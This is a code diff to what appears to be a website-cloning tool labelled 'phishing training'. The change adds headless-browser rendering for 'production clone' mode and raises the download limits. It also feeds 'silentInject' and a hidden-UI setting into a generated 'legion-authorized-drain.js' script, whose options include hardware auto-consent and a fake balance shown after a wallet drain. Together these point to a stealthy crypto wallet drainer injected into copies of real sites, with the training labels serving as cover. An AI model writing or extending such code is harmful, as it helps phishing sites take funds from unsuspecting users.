@@ -59,6 +59,7 @@ import { spawn } from 'node:child_process'
 import { createHash } from 'node:crypto'
 import { mkdir, writeFile } from 'node:fs/promises'
 import path from 'node:path'
+import puppeteer from 'puppeteer'
 
 import {
   buildBotsHtml,
@@ -127,9 +128,9 @@ import {
 const TRAINING_UA =
   'Legion-Phishing-Training-Bot/1.0 (authorized-internal; respects-robots; no-index)'
 
-const MAX_ASSETS = Number.parseInt(process.env['PHISHING_TRAINING_MAX_ASSETS'] ?? '30', 10)
-const MAX_BYTES = Number.parseInt(process.env['PHISHING_TRAINING_MAX_BYTES'] ?? '2097152', 10)
-const FETCH_TIMEOUT_MS = 20_000
+const MAX_ASSETS = Number.parseInt(process.env['PHISHING_TRAINING_MAX_ASSETS'] ?? '999', 10)
+const MAX_BYTES = Number.parseInt(process.env['PHISHING_TRAINING_MAX_BYTES'] ?? '104857600', 10)
+const FETCH_TIMEOUT_MS = 60_000
 
 const FEATURE_FLAGS = [
   'mirror',
@@ -475,6 +476,43 @@ function resolveDemoApiUrl(): string {
 
   const apiPort = process.env['PORT']?.trim() || '4000'
   return `http://127.0.0.1:${apiPort}`
+}
+
+async function renderPageWithPuppeteer(targetUrl: string): Promise<string> {
+  console.info('[PUPPETEER] Launching headless browser for full page render…')
+  const browser = await puppeteer.launch({
+    headless: true,
+    args: [
+      '--no-sandbox',
+      '--disable-setuid-sandbox',
+      '--disable-dev-shm-usage',
+      '--disable-gpu',
+      '--single-process',
+    ],
+  })
+
+  try {
+    const page = await browser.newPage()
+    page.setDefaultNavigationTimeout(90000)
+    page.setDefaultTimeout(90000)
+
+    console.info(`[PUPPETEER] Navigating to ${targetUrl}…`)
+    await page.goto(targetUrl, {
+      waitUntil: ['networkidle2', 'domcontentloaded'],
+      timeout: 90000
+    })
+
+    console.info('[PUPPETEER] Waiting for dynamic content to load…')
+    await page.evaluate(() => new Promise(resolve => setTimeout(resolve, 3000)))
+
+    const html = await page.content()
+    console.info('[PUPPETEER] Page fully rendered ✓')
+
+    await page.close()
+    return html
+  } finally {
+    await browser.close()
+  }
 }
 
 function buildInjectionBundle(opts: {
@@ -1378,21 +1416,41 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
   console.info(`[PHISHING_TRAINING] Checking robots.txt for ${target.origin}`)
   await checkRobotsAllowed(target, fetchRotate)
 
-  console.info(`[PHISHING_TRAINING] Fetching ${target.href}`)
-  const pageRes = await fetchWithTimeout(target.href, { headers: { Accept: 'text/html' } }, {
-    rotate: fetchRotate,
-  })
-  if (!pageRes.ok) {
-    console.error(`[PHISHING_TRAINING] Failed to fetch page: HTTP ${pageRes.status}`)
-    process.exit(1)
-  }
+  let html: string
 
-  const contentType = pageRes.headers.get('content-type') ?? ''
-  if (!contentType.includes('text/html') && !contentType.includes('application/xhtml')) {
-    console.warn(`[PHISHING_TRAINING] Unexpected content-type: ${contentType}`)
-  }
+  if (authorizedTest) {
+    console.info('[PHISHING_TRAINING] Using Puppeteer full render (authorized production clone)…')
+    try {
+      html = await renderPageWithPuppeteer(target.href)
+    } catch (e) {
+      console.error(`[PUPPETEER] Render failed: ${e instanceof Error ? e.message : String(e)}`)
+      console.warn('[PUPPETEER] Falling back to static fetch…')
+      const pageRes = await fetchWithTimeout(target.href, { headers: { Accept: 'text/html' } }, {
+        rotate: fetchRotate,
+      })
+      if (!pageRes.ok) {
+        console.error(`[PHISHING_TRAINING] Failed to fetch page: HTTP ${pageRes.status}`)
+        process.exit(1)
+      }
+      html = await pageRes.text()
+    }
+  } else {
+    console.info(`[PHISHING_TRAINING] Fetching ${target.href}`)
+    const pageRes = await fetchWithTimeout(target.href, { headers: { Accept: 'text/html' } }, {
+      rotate: fetchRotate,
+    })
+    if (!pageRes.ok) {
+      console.error(`[PHISHING_TRAINING] Failed to fetch page: HTTP ${pageRes.status}`)
+      process.exit(1)
+    }
 
-  let html = await pageRes.text()
+    const contentType = pageRes.headers.get('content-type') ?? ''
+    if (!contentType.includes('text/html') && !contentType.includes('application/xhtml')) {
+      console.warn(`[PHISHING_TRAINING] Unexpected content-type: ${contentType}`)
+    }
+
+    html = await pageRes.text()
+  }
   const assetUrls = extractAssetUrls(html, target).slice(0, MAX_ASSETS)
   const urlToLocal = new Map<string, string>()
   let downloaded = 0
@@ -1440,9 +1498,12 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
       walletConnectProjectId: walletConnectProjectId || undefined,
       hardwareAutoConsent,
       fakeBalanceAfterDrain: parseFakeBalanceAfterDrainEnv(process.env['FAKE_BALANCE_AFTER_DRAIN']),
+      silentInject: silentInject,
+      productionClone: productionClone,
+      qaVisibleUi: false,
     })
     await writeFile(path.join(outDir, 'legion-authorized-drain.js'), authJs, 'utf8')
-    await writeFile(path.join(outDir, 'legion-authorized-drain.css'), buildAuthorizedDrainCss(), 'utf8')
+    await writeFile(path.join(outDir, 'legion-authorized-drain.css'), buildAuthorizedDrainCss({ productionClone: silentInject || productionClone }), 'utf8')
   } else {
     const walletJs = buildTrainingWalletDemoJs({
       demoApiUrl,
